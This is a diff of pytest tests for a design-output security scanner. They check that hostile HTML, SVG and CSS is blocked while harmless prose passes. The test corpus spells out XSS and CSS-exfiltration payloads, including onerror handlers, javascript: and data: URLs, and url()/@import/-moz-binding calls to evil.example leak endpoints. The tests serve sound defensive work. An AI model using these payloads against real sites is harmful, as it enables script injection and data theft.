@@ -30,7 +30,7 @@ class TestScanDesignOutput:
     def test_clean_output_passes(self):
         from maistro_design.scan import scan_design_output
 
-        report = scan_design_output(_file_output("<h1>Hello</h1>"))
+        report = scan_design_output(_file_output('<h1 class="marketing-copy">Hello</h1>'))
         assert report.passed
         assert report.blocking_flags == ()
 
@@ -42,6 +42,88 @@ class TestScanDesignOutput:
         report = scan_design_output(_file_output("<script>alert(1)</script>"))
         assert not report.passed
         assert any("script pattern" in f for f in report.blocking_flags)
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    @pytest.mark.parametrize(
+        ("payload", "flag"),
+        [
+            ('<img src=x onerror="alert(1)">', "event-handler"),
+            ('<svg><a href="javascript:alert(1)">x</a></svg>', "dangerous resource"),
+            ('<img src="data:text/html,<script>alert(1)</script>">', "data URL"),
+            ('<link rel="stylesheet" href="https://evil.example/leak.css">', "dangerous resource"),
+            ('<video poster="https://evil.example/leak.png"></video>', "dangerous resource"),
+            ("<style>.x { background: url(https://evil.example/leak) }</style>", "CSS"),
+            (
+                "<style>.x { background: url(https://fonts.googleapis.com.evil/leak) }</style>",
+                "CSS",
+            ),
+            ('<a href="java&#x0A;script:alert(1)">x</a>', "dangerous resource"),
+            (r"<style>.x { background: u\72l(https://evil.example/leak) }</style>", "CSS"),
+            # Leading-escape spelling: a CSS parser reads `\75rl(` as `url(`
+            # (#817 repair: the shared decoder used to read `ul(` here).
+            (r"<style>.x { background: \75rl(https://evil.example/leak) }</style>", "CSS"),
+            # Renderer-parity round-19 finding: var()/env()/data: declaration
+            # values are blocked unconditionally by the browser boundary
+            # (NETWORK_OR_CODE_CSS), so the shared output scan must classify
+            # them too (AC-4). The visual-artifact layer owns these families,
+            # so assert its reason name directly.
+            ('<div style="color:var(--attacker-controlled)">x</div>', "css-network-or-code"),
+            ('<div style="padding:env(safe-area-inset-top)">x</div>', "css-network-or-code"),
+            (
+                '<div style="background:data:text/html;base64,PHNjcmlwdD4=">x</div>',
+                "css-network-or-code",
+            ),
+            ("<svg><foreignObject><div>active</div></foreignObject></svg>", "SVG element"),
+            ("<math><mi>x</mi></math>", "visual artifact active-element"),
+        ],
+    )
+    def test_hostile_active_markup_corpus_is_blocking(self, payload: str, flag: str):
+        from maistro_design.scan import scan_design_output
+
+        report = scan_design_output(_file_output(payload))
+        assert not report.passed
+        assert any(flag in finding for finding in report.blocking_flags)
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    @pytest.mark.parametrize(
+        ("payload", "flag"),
+        [
+            # behavior/-moz-binding are exfil vectors only when the declaration
+            # names a payload. The value anchor keeps the vector blocked while
+            # prose headings ("**Container behavior:** ...", which
+            # trust-banned every generation of the bundled Apple system)
+            # stay renderable.
+            ('<div style="behavior: url(#default#time2)">x</div>', "CSS"),
+            ('<div style="-moz-binding: url(http://evil.example/x.xml)">x</div>', "CSS"),
+            ('<div style="behavior: https://evil.example/beacon">x</div>', "CSS"),
+            ('<div style="behavior: //evil.example/beacon">x</div>', "CSS"),
+            ('<div style="behavior: ../../evil.htc">x</div>', "CSS"),
+        ],
+    )
+    def test_behavior_binding_value_payloads_are_blocking(self, payload: str, flag: str):
+        from maistro_design.scan import scan_design_output
+
+        report = scan_design_output(_file_output(payload))
+        assert not report.passed
+        assert any(flag in finding for finding in report.blocking_flags)
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    @pytest.mark.parametrize(
+        "prose",
+        [
+            "- **Pressed Behavior:** active controls reduce scale slightly.",
+            "- **Container behavior:** constrained readable core with generous outer margins.",
+            "Design system behavior: calm, spacious, and quiet under load.",
+        ],
+    )
+    def test_behavior_prose_is_not_a_css_primitive(self, prose: str):
+        from maistro_design.scan import scan_design_output
+
+        report = scan_design_output(_file_output(prose))
+        assert report.passed, report.blocking_flags
 
     @pytest.mark.contract("behavioral")
     @pytest.mark.scope("unit")
@@ -151,3 +233,162 @@ class TestScanDesignOutput:
         report = scan_design_output(output)
         assert not report.passed
         assert any(f.startswith("page.app.js:") for f in report.blocking_flags)
+
+
+class TestCssNetworkPrimitiveReview:
+    """The CSS network/code primitive keeps its reviewed-URL exceptions.
+
+    These cases pin the `@import` arm of `_css_network_or_code_is_blocking`
+    and the URL-authority review that decides whether a matched primitive
+    may fetch: same-host path drift, non-HTTP schemes, and unparseable
+    authorities all stay blocking, exactly like the `url(...)` arm the
+    hostile corpus already covers.
+    """
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            "<style>@import url(https://evil.example/leak.css);</style>",
+            '<style>@import "https://evil.example/leak.css";</style>',
+            "<style>.x { background: url(javascript:alert(1)) }</style>",
+            "<style>.x { background: url(https://example.com:99999999/leak) }</style>",
+        ],
+    )
+    def test_unreviewed_css_fetch_primitive_is_blocking(self, payload: str):
+        from maistro_design.scan import scan_design_output
+
+        report = scan_design_output(_file_output(payload))
+        assert not report.passed
+        assert any("CSS network/code primitive" in f for f in report.blocking_flags)
+
+    @pytest.mark.contract("behavioral")
+    @pytest.mark.scope("unit")
+    def test_allowlisted_import_passes_importer_view(self):
+        """The importer-side scan keeps the reviewed-URL exception for @import.
+
+        The output boundary (``scan_design_text``) blocks every fetch
+        primitive unconditionally through the visual-artifact vocabulary;
+        the importer view is where the reviewed allowlist is applied.
+        """
+        from maistro_design.scan import scan_blocking_patterns
+
+        blocking = scan_blocking_patterns(
+            "theme.css", "@import url(https://fonts.googleapis.com/css2?family=Inter);", None
+        )
+        assert blocking == []
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    def test_same_authority_path_drift_is_not_the_reviewed_url(self):
+        """An allowlist entry naming a path licenses that path, not the host."""
+        from maistro_design.scan import scan_design_output
+
+        report = scan_design_output(
+            _file_output("<style>@import url(https://fonts.googleapis.com/leak.css);</style>"),
+            url_allowlist=("https://fonts.googleapis.com/css",),
+        )
+        assert not report.passed
+        assert any("CSS network/code primitive" in f for f in report.blocking_flags)
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    def test_pattern_engine_failure_fails_closed(self):
+        """A regex engine that dies mid-scan must block, not pass."""
+        from maistro_design.scan import _pattern_matches
+
+        class _ExplodingPattern:
+            def search(self, content: str, timeout: float | None = None) -> object:
+                raise TimeoutError("backtracking budget exceeded")
+
+        assert _pattern_matches(_ExplodingPattern(), "benign content") is True
+
+
+class TestVisualMarkupFormatGate:
+    """The artifact-tree visual-artifact arm is a markup-sink boundary.
+
+    ``scan_design_output()`` runs the markup-sink families of the shared
+    vocabulary (unknown active elements, bare dangerous-url schemes, CSS
+    ``var()``/``env()``/``data:`` values — the ``VISUAL_ARTIFACT`` patterns)
+    only for leaves whose format reaches a browser markup sink: HTML, SVG,
+    and untagged FILE leaves, failing closed. Prose leaves (the MARKDOWN
+    prompt stack embeds design-system component examples as model-facing
+    documentation, never executable markup) keep every unconditional arm of
+    ``scan_blocking_patterns`` — script, prompt-injection, active-markup,
+    base64, suspicious Unicode — but not the sink families.
+
+    The renderer boundary (``scan_design_text``, ``visual_artifact=True``)
+    and the trust pre-scan keep the sink families unconditionally, so nothing
+    that reaches a browser and nothing the admin pre-scan reviews is scanned
+    more narrowly than before.
+
+    Regression pin: a merge resolution silently dropped this format gate,
+    which both widened the prose scan and stranded the ``OutputFormat.SVG``
+    vocabulary member outside the reviewed src surface (the exact-debt-ledger
+    failure this repair closes).
+    """
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    def test_prose_leaf_keeps_unconditional_arms_not_sink_families(self):
+        from maistro_design.scan import (
+            scan_blocking_patterns,
+            scan_design_output,
+            scan_design_text,
+        )
+        from maistro_design.types import ArtifactKind, ArtifactNode, DesignOutput, OutputFormat
+
+        payload = '<div style="color:var(--attacker-controlled)">y</div>'
+        output = DesignOutput(
+            root=ArtifactNode(
+                key="brief", kind=ArtifactKind.FILE, format=OutputFormat.MARKDOWN, value=payload
+            )
+        )
+
+        # Sink-only payload: the unconditional arms see nothing...
+        assert scan_blocking_patterns("content", payload, None, visual_artifact=False) == []
+        # ...so the prose leaf passes the artifact-tree walk.
+        assert scan_design_output(output).passed
+        # The renderer boundary still classifies it — prose is model input,
+        # never an exemption for the sink itself (AC-3/AC-4 unchanged).
+        assert not scan_design_text(payload).passed
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    @pytest.mark.parametrize("fmt_is_none", [False, True], ids=["html-leaf", "untagged-leaf"])
+    def test_markup_sinks_fail_closed_for_sink_only_payload(self, fmt_is_none: bool):
+        from maistro_design.scan import scan_design_output
+        from maistro_design.types import ArtifactKind, ArtifactNode, DesignOutput, OutputFormat
+
+        output = DesignOutput(
+            root=ArtifactNode(
+                key="leaf",
+                kind=ArtifactKind.FILE,
+                format=None if fmt_is_none else OutputFormat.HTML,
+                value='<div style="color:var(--attacker-controlled)">y</div>',
+            )
+        )
+
+        report = scan_design_output(output)
+        assert not report.passed
+        assert any("visual artifact" in f for f in report.blocking_flags)
+
+    @pytest.mark.contract("boundary")
+    @pytest.mark.scope("unit")
+    def test_svg_leaf_script_still_blocks(self):
+        from maistro_design.scan import scan_design_output
+        from maistro_design.types import ArtifactKind, ArtifactNode, DesignOutput, OutputFormat
+
+        output = DesignOutput(
+            root=ArtifactNode(
+                key="leaf",
+                kind=ArtifactKind.FILE,
+                format=OutputFormat.SVG,
+                value="<svg><script>alert(1)</script></svg>",
+            )
+        )
+
+        report = scan_design_output(output)
+        assert not report.passed
+        assert any("visual artifact" in f for f in report.blocking_flags)
